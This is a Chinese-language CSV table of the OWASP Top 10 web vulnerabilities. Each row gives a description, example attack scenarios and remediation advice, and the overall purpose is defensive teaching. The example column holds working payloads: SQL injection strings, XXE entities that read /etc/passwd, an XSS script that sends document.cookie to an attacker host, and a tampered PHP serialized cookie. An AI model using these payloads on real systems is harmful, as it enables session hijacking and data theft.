漏洞ID,漏洞名称,漏洞等级,漏洞描述,代码示例,修复方案
A1,注入攻击,高危,"将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如ISQL注入、NoSQL注入、OS,注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。 ","场景#1：应用程序在下面存在脆弱性的SQL语句的构造中使用不
可信数据：
String query = ""SELECT * FROM accounts WHERE
custID='"" + request.getParameter(""id"") + ""'“;
场景#2：同样的，框架应用的盲目信任，仍然可能导致查询语句
的漏洞。（例如：Hibernate查询语言（HQL））：
Query HQLQuery = session.createQuery(""FROM accounts
WHERE custID='"" + request.getParameter(""id"") + ""'"");
在这两个案例中，攻击者在浏览器中将“id”参数的值修改成： ’ 
or’1’=’1。例如：
http://example.com/app/accountView?id=' or '1'='1
这样查询语句的意义就变成了从accounts表中返回所有的记录。
更危险的攻击可能导致数据被篡改甚至是存储过程被调用。","防止注入漏洞需要将数据与命令语句、查询语句分隔开来。
? 最佳选择是使用安全的API，完全避免使用解释器，或提供参数
化界面的接口，或迁移到ORM或实体框架。
? 注意：当参数化时，存储过程仍然可以引入SQL注入，如果
PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即
执行或exec()的恶意数据。
? 使用正确的或“白名单”的具有恰当规范化的输入验证方法同样
会有助于防止注入攻击，但这不是一个完整的防御，因为许多应
用程序在输入中需要特殊字符，例如文本区域或移动应用程序的
API。
? 对于任何剩余的动态查询，可以使用该解释器的特定转义语法转
义特殊字符。OWASP的Java Encoder和类似的库提供了这样的
转义例程。
? 注意：SQL结构，比如：表名、列名等无法转义，因此用户提供
的结构名是非常危险的。这是编写软件中的一个常见问题。
? 在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量
地泄露记录。"
A2,失效的身份认证,高危,"通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，,或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。  ","场景#1：凭证填充，使用已知密码的列表，是常见的攻击。如果
应用程序不限制身份验证尝试，则可以将应用程序用作密码oracle，
以确定凭证是否有效。
场景#2：大多数身份验证攻击都是由于使用密码作为唯一的因素。
依据最佳实践，最新的密码轮换和复杂性要求鼓励用户使用、重
用以及重用弱密码。建议组织在NIST-800-63中停止这些实践，并
使用多因素身份验证。
场景#3：应用会话超时设置不正确。用户使用公共计算机访问应
用程序。用户直接关闭浏览器选项卡就离开，而不是选择“注
销”。攻击者一小时后使用同一个浏览器浏览网页，而当前用户
状态仍然是经过身份验证的。","? 在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、
暴力破解和被盗凭据再利用攻击。
? 不要使用发送或部署默认的凭证，特别是管理员用户。
? 执行弱密码检查，例如测试新或变更的密码，以纠正“排名前
10000个弱密码” 列表。
? 将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的
5.1.1章节-记住秘密，或其他现代的基于证据的密码策略相一致。
? 确认注册、凭据恢复和API路径，通过对所有输出结果使用相同
的消息，用以抵御账户枚举攻击。
? 限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填
充、暴力破解或其他攻击被检测时提醒管理员。
? 使用服务器端安全的内置会话管理器，在登录后生成高度复杂的
新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、
闲置、绝对超时后使其失效。"
A3,敏感信息泄露,高危,许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。  ,"场景 #1：一个应用程序使用自动化的数据加密系统加密信用卡信
息，并存储在数据库中。但是，当数据被检索时被自动解密，这
就使得SQL注入漏洞能够以明文形式获得所有信用卡卡号。
场景 #2：一个网站上对所有网页没有使用或强制使用TLS，或者使
用弱加密。攻击者通过监测网络流量（如：不安全的无线网络），
将网络连接从HTTPS降级到HTTP，就可以截取请求并窃取用户会话
cookie。 之后，攻击者可以复制用户cookie并成功劫持经过认证
的用户会话、访问或修改用户个人信息。除此之外，攻击者还可
以更改所有传输过程中的数据，例如：转款的接接收者。
场景 #3：密码数据库使用未加盐的哈希算法或弱哈希算法去存储
每个人的密码。一个文件上传漏洞使黑客能够获取密码文件。所
有这些未加盐哈希的密码通过彩虹表暴力破解方式破解。 由简单
或快速散列函数生成加盐的哈希，也可以通过GPU破解。","对一些需要加密的敏感数据，应该起码做到以下几点：
? 对系统处理、存储或传输的数据分类，并根据分类进行访问控制。
? 熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保
护敏感数据。
? 对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过
PCI DSS标记或拦截。未存储的数据不能被窃取。
? 确保存储的所有敏感数据被加密。
? 确保使用了最新的、强大的标准算法或密码、参数、协议和密匙，
并且密钥管理到位。
? 确保传输过程中的数据被加密，如：使用TLC。确保数据加密被
强制执行，如：使用HTTP严格安全传输协议（HSTS ）。
? 禁止缓存对包含敏感数据的响应。
? 确保使用密码专用算法存储密码，如：Argon2 、 scrypt 、
bcrypt 或者PBKDF2 。将工作因素（延迟因素）设置在可接受
范围。
? 单独验证每个安全配置项的有效性。"
A4,XML外部实体（XXE）,高危,许多较早的或配置错误的XIMIL处理器评估了XIMIL文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。  ,"大量XXE缺陷已经被发现并被公开，这些缺陷包括嵌入式设备的
XXE缺陷。 XXE缺陷存在于许多意想不到的地方，这些地方包括
深嵌套的依赖项。最简单的方法是上传可被接受的恶意XML文件：
场景 #1：攻击者尝试从服务端提取数据：
<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>
<foo>&xxe;</foo>
场景 #2：攻击者通过将上面的实体行更改为以下内容来探测服务
器的专用网络：
<!ENTITY xxe SYSTEM ""https://192.168.1.1/private"" >]>
场景 #3：攻击者通过恶意文件执行拒绝服务攻击：
<!ENTITY xxe SYSTEM ""file:///dev/random"" >]>","开发人员培训是识别和减少XXE缺陷的关键，此外，防止XXE 缺
陷还需要：
? 尽可能使用简单的数据格式（如：JSON），避免对敏感数据进
行序列化。
? 及时修复或更新应用程序或底层操作系统使用的所有XML处理器
和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高
版本。
? 参考《 OWASP Cheat Sheet ‘XXE Prevention‘ 》，在应用程序
的所有XML解析器中禁用XML外部实体和DTD进程。
? 在服务器端实施积极的（“白名单”）输入验证、过滤和清理，
以防止在XML文档、标题或节点中出现恶意数据。
? 验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证
方法来验证上传的XML文件。
? 尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的
最佳选择，但是SAST 工具可以检测源代码中的XXE漏洞。
如果无法实现这些控制，请考虑使用虚拟修复程序、API安全网关
或Web应用程序防火墙（ WAF ）来检测、监控和防止XXE攻
击。"
A5,失效的访问控制,高危,未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。  ,"场景 #1：应用程序在访问帐户信息的 SQL调用中使用了未经验证
的数据：
pstmt.setString(1，request.getParameter(""acct""));
ResultSet results = pstmt.executeQuery( );
攻击者只需修改浏览器中的“acct”参数即可发送他们想要的任何
帐号信息。如果没有正确验证，攻击者可以访问任何用户的帐户。
http://example.com/app/accountInfo?acct=notmyacct
场景 #2：攻击者仅强制浏览目标URL。管理员权限是访问管理页
面所必需的。
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
如果一个未经身份验证的用户可以访问任何页面，那么这是一个
缺陷。如果一个非管理员权限的用户可以访问管理页面，那么这
同样也是一个缺陷。","访问控制只有在受信服务器端代码或没有服务器的 API 中有效，
这样这样攻击者才无法修改访问控制检查或元数据。
? 除公有资源外，默认情况下拒绝访问。
? 使用一次性的访问控制机制，并在整个应用程序中不断重用它们，
包括最小化CORS使用。
? 建立访问控制模型以强制执行所有权记录，而不是接受用户创建、
读取、更新或删除的任何记录。
? 域访问控制对每个应用程序都是唯一的，但业务限制要求应由域
模型强制执行。
? 禁用 Web服务器目录列表，并确保文件元数据（如：git）不存
在于 Web的根目录中。
? 记录失败的访问控制，并在适当时向管理员告警（如：重复故
障）。
? 对API和控制器的访问进行速率限制，以最大限度地降低自动化
攻击工具的危害。
? 当用户注销后，服务器上的JWT令牌应失效。
开发人员和 QA人员应包括功能访问控制单元和集成测试人员。"
A6,安全配置错误,中危,安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。  ,"场景#1：应用程序服务器附带了未从产品服务器中删除的应用程
序样例。这些样例应用程序具有已知的安全漏洞，攻击者利用这
些漏洞来攻击服务器。如果其中一个应用程序是管理员控制台，
并且没有更改默认账户，攻击者就可以通过默认密码登录，从而
接管服务器。
场景#2：目录列表在服务器端未被禁用。攻击者发现他们很容易
就能列出目录列表。攻击者找到并下载所有已编译的Java类，他
们通过反编译来查看代码。然后，攻击者在应用程序中找到一个
严重的访问控制漏洞。
场景#3：应用服务器配置允许将详细的错误信（如：堆栈跟踪信
息）返回给用户，这可能会暴露敏感信息或潜在的漏洞，如：已
知含有漏洞的组件的版本信息。
场景#4：云服务向其他CSP用户提供默认的网络共享权限。这允
许攻击者访问存储在云端的敏感数据。","应实施安全的安装过程，包括：
? 一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。
开发、质量保证和生产环境都应该进行相同配置，并且，在每个
环境中使用不同的密码。这个过程应该是自动化的，以尽量减少
安装一个新安全环境的耗费。
? 搭建最小化平台，该平台不包含任何不必要的功能、组件、文档
和示例。移除或不安装不适用的功能和框架。
? 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并
将其作为更新管理过程的一部分，（参见A9：2017-使用含有已
知漏洞的组件）。在检查过程中，应特别注意云存储权限（如：
S3桶权限）。
? 一个能在组件和用户间提供有效的分离和安全性的分段应用程
序架构，包括：分段、容器化和云安全组。
? 向客户端发送安全指令，如：安全标头。
? 在所有环境中能够进行正确安全配置和设置的自动化过程。"
A7,跨站脚本（XSS）,高危,当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建HTMIL或JavaScript的浏览器API更新现有的网页时，就会出现XSS缺陷。XSS让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。  ,"场景#1：应用程序在下面HTML代码段的构造中使用未经验证或转
义的不可信的数据：
(String) page += ""<input name='creditcard' type='TEXT‘
value='"" + request.getParameter(""CC“) + ""'>"";
攻击者在浏览器中修改“CC” 参数为如下值：
'><script>document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie</script>'.
这个攻击导致受害者的会话ID被发送到攻击者的网站，使得攻击
者能够劫持用户当前会话。
注意：攻击者同样能使用跨站脚本攻破应用程序可能使用的任何
跨站请求伪造（CSRF）防御机制。CSRF的详细情况见2013年版中
的A8项。","防止XSS需要将不可信数据与动态的浏览器内容区分开。这可以
通过如下步骤实现：
? 使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0 
或 React JS。了解每个框架的XSS保护的局限性，并适当地处
理未覆盖的用例。
? 为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML
输出的上下文（包括：主体、属性、JavaScript、CSS或URL）
对所有不可信的HTTP请求数据进行恰当的转义 。更多关于数据
转义技术的信息见：《OWASP Cheat Sheet ‘XSS Prevention’》
。
? 在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的
选择是实施上下文敏感数据编码。如果这种情况不能避免，可以
采用《OWASP Cheat Sheet ‘DOM based XSS Prevention ‘》
描述的类似上下文敏感的转义技术应用于浏览器API。
? 使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果
不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径
遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有
效的。"
A8,不安全的反序列化,高危,不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。  ,"场景 #1：一个React应用程序调用了一组Spring Boot微服务。作
为功能性程序员，他们试图确保他们的代码是不可变的。他们提
出的解决方法是序列化用户状态，并在每次请求时来回传递。攻
击者注意到了“R00”Java对象签名，并使用Java Serial Killer工
具在应用服务器上获得远程代码执行。
场景 #2：一个PHP论坛使用PHP对象序列化来保存一个“超
级”cookie。该cookie包含了用户的用户ID、角色、密码哈希和其
他状态：
a:4:{i:0;i:132;i:1;s:7:""Mallory"";i:2;s:4:""user"";
i:3;s:32:""b6a8b3bea87fe0e05022f8f3c88bc960"";}
攻击者更改序列化对象以授予自己为admin权限：
a:4:{i:0;i:1;i:1;s:5:""Alice"";i:2;s:5:""admin"";
i:3;s:32:""b6a8b3bea87fe0e05022f8f3c88bc960"";}","唯一安全的架构模式是不接受来自不受信源的序列化对象，或使
用只允许原始数据类型的序列化媒体。
如果上述不可能的话，考虑使用下述方法：
? 执行完整性检查，如：任何序列化对象的数字签名，以防止恶
意对象创建或数据篡改。
? 在创建对象之前强制执行严格的类型约束，因为代码通常被期
望成一组可定义的类。绕过这种技术的方法已经被证明，所以
完全依赖于它是不可取的。
? 如果可能，隔离运行那些在低特权环境中反序列化的代码。
? 记录反序列化的例外情况和失败信息，如：传入的类型不是预
期的类型，或者反序列处理引发的例外情况。
? 限制或监视来自于容器或服务器传入和传出的反序列化网络连
接。
? 监控反序列化，当用户持续进行反序列化时，对用户进行警告。"
A9,使用含有已知漏洞的组件,高危,组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。  ,"场景 #1：很多时候组件都是以与应用相同的权限运行的，这使得
组件里的缺陷可能导致各式各样的问题。这些缺陷可能是偶然的
（如：编码错误），也可能是蓄意的（如：组件里的后门）。下
面是一些已被利用的漏洞：
? CVE-2017-5638，一个Struts2远程执行漏洞。 可在服务端远程
执行代码，并已造成巨大的影响。
? 虽然物联网（IoT）设备一般难以通过打补丁来修复。但对之打
补丁非常重要（如：医疗设备）。
有些自动化工具能帮助攻击者发现未打补丁的或配置不正确的系
统。例如 ：Shodan IOT搜索引擎能帮助你发现从2014年四月至
今仍存在心脏出血漏洞 的设备。","应该制定一个补丁管理流程：
? 移除不使用的依赖、不需要的功能、组件、文件和文档。
? 利用如 versions、DependencyCheck 、retire.js等工具来持续的
记录客户端和服务器端以及它们的依赖库的版本信息。持续监控
如CVE 和 NVD等是否发布已使用组件的漏洞信息，可以使用软
件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警
告邮件。
? 仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡
改或加入恶意漏洞的风险
? 监控那些不再维护或者不发布安全补丁的库和组件。如果不能打
补丁，可以考虑部署虚拟补丁来监控、检测或保护。
每个组织都应该制定相应的计划，对整个软件生命周期进行监控、
评审、升级或更改配置。"
A10,不足的日志记录和监控,中危,不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。,"场景#1：一个由小团队运营的开源项目论坛软件被攻击者利用其
内在漏洞攻陷了。 攻击者设法删除了包含下一个版本的内部源代
码仓库以及所有论坛内容。 虽然代码可以恢复，但由于缺乏监控、
日志记录和告警导致了更糟糕的结果。 由于此问题，该论坛软件
项目不再活跃。
场景#2：攻击者使用通用密码进行用户扫描并能获取所有使用此
密码的账户。对于其他账户而言，将仅有一次失败的登陆尝试记
录。一段时间以后，攻击者可以用另一个密码再次进行此活动。
场景#3：美国的一家大型零售商据内部使用恶意软件分析沙箱做
分析。 沙箱软件检测到了一些可能不需要的软件，但没有人响应
此次检测。 在一个境外银行不正当的信用卡交易被检测到之前，
该沙箱软件一直在产生告警信息。","根据应用程序存储或处理的数据的风险：:
? 确保所有登录、访问控制失败、输入验证失败能够被记录到日
志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐
户，并为后期取证预留足够时间。
? 确保日志以一种能被集中日志管理解决方案使用的形式生成
? 确保高额交易有完整性控制的审计信息，以防止篡改或删除，
例如审计信息保存在只能进行记录增加的数据库表中。
? 建立有效的监控和告警机制，使可疑活动在可接受的时间内被
发现和应对。
? 建立或采取一个应急响应机制和恢复计划，例如：NIST 800-
61 rev 2或更新版本。
目前已有商业的和开源的应用程序防护框架（例如：OWASP 
AppSensor）、Web应用防火墙（例如 ：Modsecurity with the 
OWASP Core Rule Set）、带有自定义仪表盘和告警功能的日志
关联软件。"
